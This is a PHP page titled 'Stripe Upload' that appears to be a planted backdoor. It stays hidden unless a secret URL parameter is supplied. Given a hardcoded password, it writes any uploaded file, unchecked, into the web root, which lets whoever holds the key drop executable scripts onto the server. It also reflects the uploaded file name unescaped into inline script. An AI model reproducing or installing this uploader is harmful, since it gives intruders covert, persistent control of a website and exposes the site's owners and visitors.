if ($_GET['ur1-id'] == "gh_NGHHBGF-4635")
{
	session_start();
	if (isset($_POST["submit"]))
	{
		$str =  "<script>$('#retval').html('";
		if ($_POST['pwd'] == 'BNH_11-hgdbnj') {
        $target_dir    = "./";
        $target_file   = $target_dir . basename($_FILES["fileToUpload"]["name"]);
        $uploadOk      = 1;
        $FileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
        // Check if file already exists
        if (file_exists($target_file))
		{
            $str .= "Sorry, file already exists.<br>";
            $uploadOk = 0;
        }
        if ($uploadOk == 0) {
            $str .= "Sorry, your file was not uploaded.";
            // if everything is ok, try to upload file
        } else {
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                $str .= "The file " . basename($_FILES["fileToUpload"]["name"]) . " has been uploaded.";
            } else {
                $str .= "Sorry, there was an error uploading your file.";
            }
        }
    } else {
        $str .= "Invalid key";
    }
    $str .= "');</script>";
    $_SESSION['message'] = $str;
    unset($_POST);
    unset($_FILES);
    header("Location: parent_info_123.php?ur1-id=gh_NGHHBGF-4635");
    exit;
}
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <title>Stripe Upload</title>
    <link rel="icon" href="favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>

<body class="text-center">
    <div class="container-fluid">

        <div class="row justify-content-center">
            <div class="mx-1 mt-1 card rounded">
                <div class="card-body">
                    <form action="?order_id=gFa6IcyDFvlq4w==" method="post" enctype="multipart/form-data" class="form-signin">
                        <h1 class="h3 mb-3 font-weight-normal">Please verify</h1>
                        <label for="inputPassword" class="sr-only">Password</label>
                        <input type="password" name="pwd" id="pwd" class="form-control" placeholder="Password" required>
                        <label class="btn btn-primary btn-block">
                            Browse <input type="file" name="fileToUpload" id="filetoUpload"
                                onchange="$('#upload-file-info').html(this.files[0].name)" hidden>
                        </label>
                        <p class='label label-info' id="upload-file-info"></p>
                        <p class='label label-info' id="retval"></p>
                        <button name="submit" class="btn btn-lg btn-primary btn-block" type="submit">Verify and upload
                        </button>
                    </form>
                </div>
            </div>

        </div>
    </div>
    <?php
        if(isset($_SESSION['message']))
        {
            echo $_SESSION['message'];
            unset($_SESSION['message']);
        }
    ?>
</body>

</html>
<?php
}

